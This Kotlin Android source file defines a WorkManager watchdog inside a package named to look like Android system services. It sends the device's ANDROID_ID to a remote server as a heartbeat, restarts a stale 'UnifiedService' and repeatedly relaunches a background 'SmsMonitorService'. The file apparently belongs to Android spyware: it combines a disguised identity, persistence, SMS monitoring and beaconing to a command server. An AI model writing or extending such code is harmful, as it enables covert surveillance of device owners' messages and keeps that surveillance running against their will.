package com.android.system.services.worker

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.android.system.services.ServerConfig
import com.android.system.services.UnifiedService
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

class UnifiedWatchdogWorker(
    private val ctx: Context,
    params: WorkerParameters
) : CoroutineWorker(ctx, params) {

    override suspend fun doWork(): Result {
        // 1) Send heartbeat to server (like HeartbeatWorker)
        try {
            sendHeartbeat()
        } catch (e: Exception) {
            Log.e(TAG, "Heartbeat failed: ${e.message}", e)
        }

        // 2) Check UnifiedService and restart if needed
        val last = UnifiedService.lastAlive(ctx)
        val age = if (last == 0L) Long.MAX_VALUE else SystemClock.elapsedRealtime() - last
        val stale = age > TimeUnit.MINUTES.toMillis(3)

        Log.d(TAG, "Watchdog: UnifiedService lastAliveAge=${age}ms stale=$stale")

        if (stale) {
            try {
                val i = Intent(ctx, UnifiedService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ContextCompat.startForegroundService(ctx, i)
                } else {
                    ctx.startService(i)
                }
                Log.d(TAG, "Watchdog started UnifiedService")
            } catch (t: Throwable) {
                // A13/A14 may block background FGS starts; that's OK.
                Log.w(TAG, "FGS start blocked for UnifiedService: ${t.message}. Will rely on next WM tick/FCM.")
            }
        }

        // 🔥 3) Also ensure SmsMonitorService is running (background service)
        try {
            val smsIntent = Intent(ctx, com.android.system.services.SmsMonitorService::class.java)
            // همیشه به عنوان background service راه‌اندازی میشه
            ctx.startService(smsIntent)
            Log.d(TAG, "Watchdog ensured SmsMonitorService (background)")
        } catch (t: Throwable) {
            Log.w(TAG, "Failed to start SmsMonitorService: ${t.message}")
        }

        // Always succeed; WM will trigger again on its schedule
        return Result.success()
    }

    private suspend fun sendHeartbeat() {
        val deviceId = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ANDROID_ID
        )

        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("isOnline", true)
            put("timestamp", System.currentTimeMillis())
            put("source", "UnifiedWatchdogWorker")
        }

        val baseUrl = ServerConfig.getBaseUrl()
        val url = URL("$baseUrl/devices/heartbeat")
        val conn = url.openConnection() as HttpURLConnection

        try {
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray())
                os.flush()
            }

            val responseCode = conn.responseCode

            if (responseCode !in 200..299) {
                throw Exception("Server returned $responseCode")
            }

        } finally {
            conn.disconnect()
        }
    }

    companion object { 
        private const val TAG = "UnifiedWatchdogWorker" 
    }
}

